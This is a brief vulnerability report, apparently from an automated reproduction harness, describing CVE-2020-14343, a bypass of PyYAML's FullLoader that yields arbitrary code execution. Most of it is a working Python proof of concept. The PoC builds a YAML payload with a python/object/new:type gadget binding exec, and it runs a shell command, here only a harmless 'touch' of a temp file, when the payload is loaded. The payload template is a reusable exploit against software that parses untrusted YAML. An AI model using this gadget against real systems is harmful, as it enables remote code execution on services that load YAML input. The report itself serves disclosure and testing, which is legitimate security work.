report.title: Arbitrary code execution via FullLoader bypass in PyYAML
report.body:
I found a vulnerability in this package. yaml.load with FullLoader can be escaped through a python/object/new:type gadget to reach exec.

Tracked as CVE-2020-14343.

Proof of concept:

```python
import os, tempfile, yaml
s = os.path.join(tempfile.gettempdir(), "slopgate_pyyaml")
try:
    os.remove(s)
except OSError:
    pass
code = "__import__('os').system('touch ' + r'%s')" % s
payload = (
    "!!python/object/new:type\n"
    "  args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:exec }]\n"
    "  listitems: \"%s\"\n" % code
)
try:
    yaml.load(payload, Loader=yaml.FullLoader)
except Exception as e:
    print("raised:", type(e).__name__, str(e)[:160])
print("SLOPGATE:REPRODUCED" if os.path.exists(s) else "SLOPGATE:NOT_REPRODUCED")
```
